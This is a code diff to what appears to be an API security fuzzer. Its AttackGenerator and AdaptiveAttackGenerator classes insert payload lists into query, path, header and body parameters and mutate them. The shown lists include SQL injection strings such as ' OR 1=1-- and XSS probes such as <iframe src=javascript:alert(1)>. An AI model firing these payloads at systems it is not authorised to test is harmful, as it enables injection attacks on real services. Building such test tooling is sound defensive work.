@@ -1,9 +1,10 @@
-import itertools
 import random
+
 
 class AttackGenerator:
 
     def __init__(self):
+
         self.sql_payloads = [
             "' OR '1'='1",
             "' OR 1=1--",
@@ -23,7 +24,7 @@ class AttackGenerator:
             "<body onload=alert(1)>",
             "<iframe src=javascript:alert(1)>",
             "<details open ontoggle=alert(1)>",
-            "<math href='javascript:alert(1)'>"
+            "<math href='javascript:alert(1)>"
         ]
 
         self.cmd_payloads = [
@@ -59,9 +60,42 @@ class AttackGenerator:
             "1"
         ]
 
+    def _build_payload(self, param, location, payload, method):
+        """
+        Convert raw payload into executor-compatible structure
+        """
+
+        name = param.get("name")
+        loc = param.get("in", location)
+
+        # QUERY PARAM
+        if loc == "query":
+            return {
+                "params": {name: payload}
+            }
+
+        # PATH PARAM
+        if loc == "path":
+            return {
+                "path_params": {name: payload}
+            }
+
+        # HEADER
+        if loc == "header":
+            return {
+                "headers": {name: str(payload)}
+            }
+
+        # BODY (default for POST)
+        return {
+            "body": {name: payload}
+        }
+
     def generate_for_endpoint(self, endpoint):
-        params = endpoint.get("params", [])
-        method = endpoint.get("method")
+
+        params = endpoint.get("parameters", [])
+        method = endpoint.get("method", "GET").upper()
+
         attacks = []
 
         payload_groups = [
@@ -73,13 +107,21 @@ class AttackGenerator:
         ]
 
         for param in params:
+
+            location = param.get("in", "query")
+
             for group in payload_groups:
                 for payload in group:
-                    attacks.append({
-                        "method": method,
-                        "param": param,
-                        "payload": payload
-                    })
+
+                    attack = self._build_payload(
+                        param,
+                        location,
+                        payload,
+                        method
+                    )
+
+                    attack["__family__"] = group[0]  # tag family loosely
+                    attacks.append(attack)
 
         return attacks
 
@@ -90,6 +132,7 @@ class AdaptiveAttackGenerator:
         self.base = AttackGenerator()
 
     def expand(self, endpoint):
+
         base_cases = self.base.generate_for_endpoint(endpoint)
 
         mutations = [
@@ -108,10 +151,16 @@ class AdaptiveAttackGenerator:
         for case in base_cases:
             expanded.append(case)
 
-            for m in mutations:
-                mutated = dict(case)
-                mutated["payload"] = m(case["payload"])
-                expanded.append(mutated)
+            # mutate only actual values inside payload
+            for key in ["params", "body", "headers", "path_params"]:
+                if key in case:
+                    for param_name, value in case[key].items():
+
+                        for m in mutations:
+                            mutated = dict(case)
+                            mutated[key] = dict(case[key])
+                            mutated[key][param_name] = m(str(value))
+                            expanded.append(mutated)
 
         random.shuffle(expanded)
         return expanded
